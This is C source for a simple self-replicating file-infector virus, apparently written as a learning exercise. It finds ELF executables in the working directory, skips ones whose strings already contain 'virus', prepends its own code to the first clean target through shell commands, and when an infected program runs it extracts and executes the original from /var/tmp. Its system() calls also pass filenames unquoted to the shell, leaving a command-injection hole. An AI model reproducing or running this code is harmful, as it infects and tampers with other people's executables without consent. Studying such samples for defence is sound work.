#include<stdio.h>
#include<stdlib.h>
#include<string.h>


int check_infection(char[]);
int check_ELF(char[]);
void get_array_printed(char[]);

int main(int argc, char* argv[])
{
    FILE *fp;
	FILE *fvirus,*ftarget,*finfected_target;
    int i=0;
	int j=0;
 	int ch_count=0;
	int end;
	char ch;
	char get_filename[100];
	char infection_spread_command[500] = "cat virus ";
	char get_infected_first[200] = " > /var/tmp/infected.tmp;mv /var/tmp/infected.tmp ";
	char get_infected_second[100] = ";chmod u+x ";
	char target_execution_command[1000] = "/var/tmp/infected_target ";
   
	system("ls > /var/tmp/directory-listing.txt");
    fp = fopen("/var/tmp/directory-listing.txt", "r");
    while (!feof(fp))
    {
        ch  = fgetc(fp);
        if (ch == '\n')
		{
            get_filename[ch_count] = '\0';
            i=0;
            ch_count = 0;
            if(check_ELF(get_filename))
            {
               if (check_infection(get_filename) == 0)
				{
  			    	strcat(infection_spread_command,get_filename);
					strcat(infection_spread_command,get_infected_first);
					strcat(infection_spread_command, get_filename);
					strcat(infection_spread_command, get_infected_second);
					strcat(infection_spread_command, get_filename);
					system(&infection_spread_command[0]);
					break;
				}
				
            }			
    	}
    	else
    	{
        	get_filename[i] = ch;
        	i++;
        	ch_count++;
    	}
	}

	if(strcmp(argv[0],"virus") == 0 || strcmp(argv[0] , "./virus") == 0)
	{
		exit(0);
	}

	else
	{
		printf("Hello! I am a simple virus!\n");
		fvirus = fopen("virus", "r");
		fseek(fvirus,0,SEEK_END);
		end = ftell(fvirus);
		fclose(fvirus);
	   	finfected_target = fopen(argv[0],"r");
		ftarget = fopen("/var/tmp/infected_target","w");
		fseek(finfected_target, end, SEEK_SET);
		while (!feof(finfected_target))
		{
			ch = fgetc(finfected_target);
			fputc(ch, ftarget);
		}
		fclose(finfected_target);
		fclose(ftarget);
		system("chmod u+x /var/tmp/infected_target");
		if(argc==1)	
		{
			system("/var/tmp/infected_target");
		}
		else
		{
			for (i=2; i<=argc; i++)
			{	
				if(i == argc)
					strcat(target_execution_command, argv[i-1]);
				else
					{
						strcat(target_execution_command, argv[i-1]);
						strcat(target_execution_command, " ");
					}
			}
			system(&target_execution_command[0]);			
		}	
	}
    return 0;
}

int check_infection (char get_filename[])
{
	char output[400];
	char command [400] = "strings " ; 
	char command_grep[] = "| grep virus > /var/tmp/strings-command-result.txt";
	char inf[] = "virus";
	int i,j;
	FILE *finf;
	for (i=8,j=0;j < strlen(get_filename); i++,j++)
    {
        command[i] = get_filename[j];
    }
	command[i] = '\0';
	strcat(command,command_grep);
	system(&command[0]);	
	finf = fopen("/var/tmp/strings-command-result.txt", "r");
   	fgets(output,399,finf);
    if (strstr(output,inf) != NULL)
        return 1;
    else
        return 0;
}

int check_ELF(char get_filename[])
{
    char command[200] = {'f', 'i', 'l','e',' '};
    char elf[] = "ELF";
    char output[200];
    char outputfilenamecommand[] = " > /var/tmp/file-command-result.txt";
    FILE *felf;
    int i,j;
    for (i=5,j=0;j < strlen(get_filename); i++,j++)
    {
        command[i] = get_filename[j];
    }
    command[i]='\0';
    strcat(command,outputfilenamecommand);
	system(&command[0]);
    felf = fopen("/var/tmp/file-command-result.txt", "r");
    fgets(output,199,felf);
    if (strstr(output,elf) != NULL)
	    return 1;
    else
        return 0;
}

void get_array_printed(char a[])
{
    int i;
	for(i=0; i<strlen(a);i++)
	{
 	   printf("%c", a[i]);
    }
    printf("\n");
}

